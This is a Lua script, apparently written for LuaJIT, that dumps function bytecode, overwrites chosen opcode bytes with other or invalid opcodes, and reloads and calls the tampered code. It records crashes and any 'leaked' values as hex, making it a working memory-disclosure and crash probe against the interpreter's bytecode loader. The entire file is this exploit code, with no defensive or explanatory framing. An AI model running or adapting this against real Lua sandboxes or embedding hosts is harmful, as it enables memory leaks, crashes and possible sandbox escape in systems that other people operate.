local results = {}
local ls = rawget(_G, "loadstring")
if not ls then return {"ERROR:no_loadstring"} end

local function find_kpri_true(bc)
  for i = 1, #bc - 3 do
    if bc:byte(i) == 0x2b and bc:byte(i + 1) == 0 and
       bc:byte(i + 2) == 2 and bc:byte(i + 3) == 0 then
      return i
    end
  end
end

local function find_kshort_42(bc)
  for i = 1, #bc - 3 do
    if bc:byte(i) == 0x29 then
      local d = bc:byte(i + 2) + bc:byte(i + 3) * 256
      if d == 42 then
        return i
      end
    end
  end
end

local base_fn = function() return true end
local bc = string.dump(base_fn)
local kpri_pos = find_kpri_true(bc)
if not kpri_pos then
  return {"ERROR:pattern_not_found"}
end

local crash_bc = bc:sub(1, kpri_pos - 1) ..
                 string.char(0x27, 0x00, 0x00, 0x00) ..
                 bc:sub(kpri_pos + 4)
local fn, err = ls(crash_bc)
if not fn then
  return {"load_failed:" .. tostring(err)}
end

local ok, val = pcall(fn)
if ok then
  results[1] = "call_ok:" .. type(val) .. ":" .. tostring(val)
  if type(val) == "string" then
    results[2] = "leaked_string_len:" .. #val
    local hex = {}
    for i = 1, math.min(32, #val) do
      hex[#hex + 1] = string.format("%02x", val:byte(i))
    end
    results[3] = "leaked_hex:" .. table.concat(hex, " ")
  else
    results[2] = "leaked_type:" .. type(val)
  end
else
  results[1] = "call_error:" .. tostring(val)
end

local fn2 = function() return 42 end
local bc2 = string.dump(fn2)
local kshort_pos = find_kshort_42(bc2)
if kshort_pos then
  local crash_bc2 = bc2:sub(1, kshort_pos - 1) ..
                    string.char(0x27) ..
                    bc2:sub(kshort_pos + 1)
  local fn2b, err2 = ls(crash_bc2)
  if fn2b then
    local ok2, val2 = pcall(fn2b)
    if ok2 then
      results[4] = "fn2_ok:" .. type(val2) .. ":" .. tostring(val2)
    else
      results[4] = "fn2_error:" .. tostring(val2)
    end
  else
    results[4] = "fn2_load_err:" .. tostring(err2)
  end
else
  results[4] = "kshort_not_found"
end

local fn3 = function() return true end
local bc3 = string.dump(fn3)
local kpri_pos3 = find_kpri_true(bc3)
if kpri_pos3 then
  local crash_bc3 = bc3:sub(1, kpri_pos3 - 1) ..
                    string.char(0x33, 0x00, 0x00, 0x00) ..
                    bc3:sub(kpri_pos3 + 4)
  local fn3b, err3 = ls(crash_bc3)
  if fn3b then
    local ok3, val3 = pcall(fn3b)
    if ok3 then
      results[5] = "fnew_ok:" .. type(val3)
    else
      results[5] = "fnew_error:" .. tostring(val3)
    end
  else
    results[5] = "fnew_load_err:" .. tostring(err3)
  end
end

local fn4 = function() return 42 end
local bc4 = string.dump(fn4)
local pos4 = find_kshort_42(bc4)
if pos4 then
  local crash_bc4 = bc4:sub(1, pos4 - 1) ..
                    string.char(0xFE) ..
                    bc4:sub(pos4 + 1)
  local fn4b, err4 = ls(crash_bc4)
  if fn4b then
    local ok4, val4 = pcall(fn4b)
    if ok4 then
      results[6] = "invalid_op_call_ok:" .. type(val4) .. ":" .. tostring(val4)
    else
      results[6] = "invalid_op_call_err:" .. tostring(val4)
    end
  else
    results[6] = "invalid_op_load_err:" .. tostring(err4)
  end
end

return results

